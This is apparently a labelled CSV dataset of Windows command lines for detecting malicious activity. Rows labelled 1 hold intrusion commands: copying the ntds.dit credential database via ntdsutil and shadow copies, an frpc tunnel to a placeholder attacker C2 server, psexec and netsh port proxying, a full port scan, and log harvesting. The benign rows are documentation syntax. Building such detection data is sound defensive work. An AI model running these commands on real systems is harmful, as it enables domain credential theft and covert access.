command,,,,label
"""C:\pstools\psexec.exe"" {REDACTED} -s cmd /c ""cmd.exe /c netsh
interface portproxy delete v4tov4 listenaddress=0.0.0.0
listenport=9999",,,,1
"ntdsutil snapshot “activate instance ntds”
create quit quit",,,,0
"ntdsutil snapshot “ac i ntds”
create quit quit",,,,1
"HKEY_LOCAL_MACHINE\SYSTEM\ControlSet001\Services\PortProxy\v4tov4
\cp\0.0.0.0/49275 | {redacted IP address}/8443.",,,,1
"C:\Windows\NTDS\ntds.dit' to
'\\?\GLOBALROOT\Device\{redacted}VolumeShadowC
opy1\Windows\NTDS\ntds.dit'",,,,1
C:\Windows\Temp\tmp\Active Directory\ntds.dit,,,,1
"# Establishes a TCP tunnel to the attacker's server
frpc tcp -s <C2_SERVER_IP>:<PORT> -t <AUTH_TOKEN> --ue --uc -l <LOCAL_PORT> -r <REMOTE_PORT>",,,,1
"
scanline.exe -t 192.168.1.0/24 -p 1-65535",,,,1
"Get-EventLog security -instanceid 4624 -after
{redacted date} | fl * | Out-File
'C:\users\public\documents\user.dat'",,,,1
"Get-EventLog security -instanceid 4624 | Where-
Object {$_.message.contains('{redacted user
account}')} | select -First 1 | fl ",,,,1
evntcmd [/s <computername>] [/v <verbositylevel>] [/n] <filename>,,,,0
fc /a [/c] [/l] [/lb<n>] [/n] [/off[line]] [/t] [/u] [/w] [/<nnnn>] [<drive1>:][<path1>]<filename1> [<drive2>:][<path2>]<filename2>,,,,0
"@echo off
rem  This batch program formats and checks new disks.
rem  It is named Checknew.bat.
rem
rem echo Insert new disk in Drive B.
pause
format b: /v chkdsk b:",,,,0
"create lun simple [size=<n>] [drives=<n>] [noerr]
create lun stripe [size=<n>] [drives=<n, n> [,...]]  [stripesize=<n>] [noerr]
create lun raid [size=<n>] [drives=<n, n> [,...]] [stripesize=<n>] [noerr]
create lun mirror [size=<n>] [drives=<n, n> [,...]] [stripesize=<n>] [noerr]
create lun automagic size=<n> [noerr]
create target name=<name> [iscsiname=<iscsiname>] [noerr]
create tpgroup [noerr]",,,,0
"lbpolicy set lun type=<type> [paths=<path>-{primary | <weight>}[,<path>-{primary | <weight>}[,…]]]",,,,0
login target iadapter=<iadapter> [type={manual | persistent | boot}] [chap={none | oneway | mutual}] [iportal=<iportal>] [tportal=<tportal>] [<flag> [<flag> […]]],,,,0
Volume c: alias System1    GUID \\?\Volume{XXXXXXXX-XXXX-XXXX-XXXX-XXXXXXXXXXXX}\,,,,0
diskshadow/add/delete shadows [all | volume <volume> | oldest <volume> | set <setID> | id <shadowID> | exposed {<drive> | <mountpoint>}],,,,0
